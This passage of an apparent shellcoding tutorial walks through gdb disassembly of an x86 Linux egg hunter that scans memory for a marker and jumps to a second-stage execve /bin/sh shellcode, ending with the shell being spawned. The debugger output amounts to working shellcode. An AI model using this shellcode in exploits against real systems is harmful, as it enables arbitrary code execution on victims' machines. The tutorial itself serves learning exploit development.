   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
=> 0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
   0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a084 in egg_hunter ()
~~~

After performing an unconditional jump to the memory location referenced by the `EDI` register, the execution of the process is redirected to `0x0804a0a8` which contains the first instruction of the `exexve-stack` `/bin/sh` shellcode. Continuing the execution of the process results in the execution of `/bin/sh`.

~~~ nasm
(gdb)
$4057 = 0x534b534b
$4058 = 0x804a0a4
$4059 = 0x804a0a0
$4060 = 0x804a0a8
0x804a0a8 <second_stage+8>:	0x31	0xc0	0x50	0x68
eflags         0x246	[ PF ZF IF ]
Dump of assembler code for function egg_hunter:
   0x0804a060 <+0>:	cld    
   0x0804a061 <+1>:	xor    eax,eax
   0x0804a063 <+3>:	xor    edx,edx
   0x0804a065 <+5>:	or     dx,0xfff
   0x0804a06a <+10>:	inc    edx
   0x0804a06b <+11>:	lea    ebx,[edx+0x4]
   0x0804a06e <+14>:	mov    eax,0x21
   0x0804a073 <+19>:	int    0x80
   0x0804a075 <+21>:	cmp    al,0xf2
   0x0804a077 <+23>:	je     0x804a065 <egg_hunter+5>
   0x0804a079 <+25>:	mov    eax,0x534b534b
   0x0804a07e <+30>:	mov    edi,edx
   0x0804a080 <+32>:	scas   eax,DWORD PTR es:[edi]
   0x0804a081 <+33>:	jne    0x804a06a <egg_hunter+10>
   0x0804a083 <+35>:	scas   eax,DWORD PTR es:[edi]
   0x0804a084 <+36>:	jne    0x804a06a <egg_hunter+10>
=> 0x0804a086 <+38>:	jmp    edi
   0x0804a088 <+40>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a086 in egg_hunter ()
(gdb)
$4061 = 0x534b534b
$4062 = 0x804a0a4
$4063 = 0x804a0a0
$4064 = 0x804a0a8
0x804a0a8 <second_stage+8>:	0x31	0xc0	0x50	0x68
eflags         0x246	[ PF ZF IF ]
Dump of assembler code for function second_stage:
   0x0804a0a0 <+0>:	dec    ebx
   0x0804a0a1 <+1>:	push   ebx
   0x0804a0a2 <+2>:	dec    ebx
   0x0804a0a3 <+3>:	push   ebx
   0x0804a0a4 <+4>:	dec    ebx
   0x0804a0a5 <+5>:	push   ebx
   0x0804a0a6 <+6>:	dec    ebx
   0x0804a0a7 <+7>:	push   ebx
=> 0x0804a0a8 <+8>:	xor    eax,eax
   0x0804a0aa <+10>:	push   eax
   0x0804a0ab <+11>:	push   0x68732f6e
   0x0804a0b0 <+16>:	push   0x69622f2f
   0x0804a0b5 <+21>:	mov    ebx,esp
   0x0804a0b7 <+23>:	push   eax
   0x0804a0b8 <+24>:	mov    edx,esp
   0x0804a0ba <+26>:	push   ebx
   0x0804a0bb <+27>:	mov    ecx,esp
   0x0804a0bd <+29>:	mov    al,0xb
   0x0804a0bf <+31>:	int    0x80
   0x0804a0c1 <+33>:	add    BYTE PTR [eax],al
End of assembler dump.
0x0804a0a8 in second_stage ()
(gdb) c
Continuing.
process 5139 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
$
~~~
